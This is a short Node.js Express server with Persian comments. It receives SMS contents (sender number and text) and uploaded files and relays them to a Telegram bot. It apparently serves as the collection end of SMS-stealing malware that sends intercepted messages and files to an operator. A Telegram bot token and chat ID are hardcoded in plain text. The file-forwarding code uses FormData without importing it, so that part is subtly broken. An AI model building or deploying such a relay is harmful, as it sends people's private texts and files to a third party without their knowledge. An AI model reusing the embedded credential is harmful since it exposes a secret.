// index.js
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const axios = require('axios');
const app = express();
const port = 3000;

// Token و ID ربات تلگرام
const BOT_TOKEN = '5918897673:AAFyKUA2IcLqh-sgkL7NWsj9aeCRpPevMLU'
const CHAT_ID = '1040260610'

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// برای دریافت پیام‌های متنی مثل SMS
app.post('/sms', async (req, res) => {
  const { number, body } = req.body;
  const message = `📥 پیامک جدید:\n📱 شماره: ${number}\n✉️ متن: ${body}`;
  await sendToTelegram(message);
  res.sendStatus(200);
});

// برای ارسال فایل
const storage = multer.diskStorage({
  destination: 'uploads/',
  filename: (req, file, cb) => {
    const filename = Date.now() + '-' + file.originalname;
    cb(null, filename);
  },
});
const upload = multer({ storage });

app.post('/upload', upload.single('file'), async (req, res) => {
  const filePath = req.file.path;
  await sendFileToTelegram(filePath);
  fs.unlinkSync(filePath); // حذف فایل پس از ارسال
  res.sendStatus(200);
});

// ارسال پیام متنی به تلگرام
async function sendToTelegram(text) {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
    });
  } catch (err) {
    console.error('❌ خطا در ارسال پیام:', err.message);
  }
}

// ارسال فایل به تلگرام
async function sendFileToTelegram(filePath) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', fs.createReadStream(filePath));

    await axios.post(url, formData, {
      headers: formData.getHeaders(),
    });
  } catch (err) {
    console.error('❌ خطا در ارسال فایل:', err.message);
  }
}

// اجرا
app.listen(port, () => {
  console.log(`✅ Server running on http://localhost:${port}`);
});
